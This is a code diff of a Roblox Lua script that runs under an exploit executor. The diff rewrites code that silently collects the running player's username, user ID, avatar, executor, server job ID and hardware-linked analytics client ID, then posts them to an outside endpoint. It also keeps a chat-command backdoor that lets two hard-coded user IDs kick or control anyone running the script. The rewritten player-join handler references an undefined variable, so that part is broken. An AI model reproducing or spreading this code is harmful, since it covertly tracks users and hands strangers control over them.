@@ -1,13 +1,42 @@
 --!nolint
 --!nocheck
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local Services, Admins do
+    Services = setmetatable({}, {
+        __index = function(_, Name)
+            local Service = game:GetService(Name)
+            if Service then
+                return Service
+            else
+                return nil
+            end
+        end
+    })
 
-local Admins = {
-    [233377111] = true,
-    [5825720479] = true,
-}
+    Admins = {
+        [233377111] = true,
+        [5825720479] = true,
+    }
+end
+
+local LocalPlayer = Services.Players.LocalPlayer
+
+local PREFIX = "/"
+local SILENTPREFIX = "/e"
+
+local FindPlayer = function(Name)
+    if #Name < 3 then
+        return nil
+    end
+
+    Name = string.lower(Name)
+    for _, User in pairs(Services.Players:GetPlayers()) do
+        if string.sub(string.lower(User.Name), 1, #Name) == Name then
+            return User
+        end
+    end
+    return nil
+end
 
 local Commands = {
     ["kick"] = function()
@@ -32,94 +61,58 @@ local Commands = {
     end,
 }
 
-local function FindUser(Name)
-    if #Name < 3 then
-        return nil
-    end
-
-    Name = string.lower(Name)
-    for _, player in pairs(Players:GetPlayers()) do
-        if string.sub(string.lower(player.Name), 1, #Name) == Name then
-            return player
-        end
-    end
-    return nil
-end
-
-for _, Player in pairs(Players:GetPlayers()) do
-    if Admins[Player.UserId] then
-        Player.Chatted:Connect(function(message)
-            local args = string.split(message, " ")
-            local command = args[1]:lower()
-            local targetName = args[2]
-
-            if command:sub(1, 3) == "/e " then
-                command = command:sub(4)
-            end
-            
-            if targetName then
-                local target = FindUser(targetName)
-                if target then
-                    if target == LocalPlayer and Commands[command] then
-                        Commands[command]()
-                    end
-                end
-            end
-        end)
+local ImageUrl = nil
+local AvatarRequest = request({Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .."&size=420x420&format=Png&isCircular=false"})
+if AvatarRequest.StatusCode == 200 then
+    local Data = game.HttpService:JSONDecode(AvatarRequest.Body)
+    if Data and Data.data then
+        ImageUrl = Data.data[1].imageUrl
     end
 end
-
-Players.PlayerAdded:Connect(function(player)
-    if Admins[player.UserId] then
-        player.Chatted:Connect(function(message)
-            local args = string.split(message, " ")
-            local command = args[1]:lower()
-            local targetName = args[2]
-
-            if command:sub(1, 3) == "/e " then
-                command = command:sub(4)
-            end
-
-            if targetName then
-                local target = FindUser(targetName)
-                if target then
-                    if target == LocalPlayer and Commands[command] then
-                        Commands[command]()
-                    end
-                end
-            end
-        end)
-    end
-end)
-
-local Executor = identifyexecutor()
-local ExecutorText = tostring(identifyexecutor())
 
 local embed = {
-	["title"] = LocalPlayer.Name,
-	["color"] = 0x2f5bc7,
-	["fields"] = {
-		{
-			["name"] = "Executor",
-			["value"] = ExecutorText,
-			["inline"] = true
-		},
-		{
-			["name"] = "Game",
-			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-			["inline"] = true
-		},
-		{
-			["name"] = "JobId",
-			["value"] = game.JobId,
-			["inline"] = true
-		},
-		{
-			["name"] = "RbxAnalytics HWID",
-			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-			["inline"] = true
-		}
-	}
+    title = "Tear Execution",
+    color = 0x2f5bc7,
+    footer = {
+        text = game:GetService("RbxAnalyticsService"):GetClientId()
+    },
+    thumbnail = {
+        url = ImageUrl
+    },
+    author = {
+        name = "Click here to view profile",
+        url = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
+        icon_url = ""
+    },
+    fields = {
+        {
+            name = "👤 User Details",
+            value = string.format(
+                "**Username** ```%s```\n**User ID** ```lua\n%d```",
+                LocalPlayer.Name,
+                LocalPlayer.UserId
+            ),
+            inline = true
+        },
+        {
+            name = "⚙️ Execution",
+            value = string.format(
+                "**Executor Name** ```%s```",
+                identifyexecutor()
+            ),
+            inline = true
+        },
+        {
+            name = "🌍 Place Information",
+            value = string.format(
+                "**Place Name** ```%s```\n**Place ID** ```lua\n%d```\n**Job ID** ```lua\n%s```",
+                game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                game.PlaceId,
+                game.JobId
+            ),
+            inline = true
+        }
+    }
 }
 
 local payload = {
@@ -146,4 +139,54 @@ local httpRequest = {
 	Body = game:GetService("HttpService"):JSONEncode(payload)
 }
 
-request(httpRequest)
+if request then
+    request(httpRequest)
+end
+
+local HandleCommand = function(Player, Message)
+    if Message:sub(1, #SILENTPREFIX) == SILENTPREFIX then
+        local Arguments = string.split(Message:sub(#SILENTPREFIX + 2), " ")
+        local Command = table.remove(Arguments, 1)
+
+        if Commands[string.lower(Command)] then
+            local Target = Arguments[1]
+            local TargetPlayer = FindPlayer(Target)
+
+            if TargetPlayer then
+                if TargetPlayer == LocalPlayer then
+                    Commands[string.lower(Command)]()
+                end
+            end
+        end
+    elseif Message:sub(1, #PREFIX) == PREFIX then
+        local Arguments = string.split(Message:sub(#PREFIX + 1), " ")
+        local Command = table.remove(Arguments, 1)
+
+        if Commands[string.lower(Command)] then
+            local Target = Arguments[1]
+            local TargetPlayer = FindPlayer(Target)
+
+            if TargetPlayer then
+                if TargetPlayer == LocalPlayer then
+                    Commands[string.lower(Command)]()
+                end
+            end
+        end
+    end
+end
+
+for _, Player in next, Services.Players:GetPlayers() do
+    if Admins[Player.UserId] then
+        Player.Chatted:Connect(function(Message)
+            HandleCommand(Player, Message)
+        end)
+    end
+end
+
+Services.Players.PlayerAdded:Connect(function()
+    if Admins[Player.UserId] then
+        Player.Chatted:Connect(function(Message)
+            HandleCommand(Player, Message)
+        end)
+    end
+end)
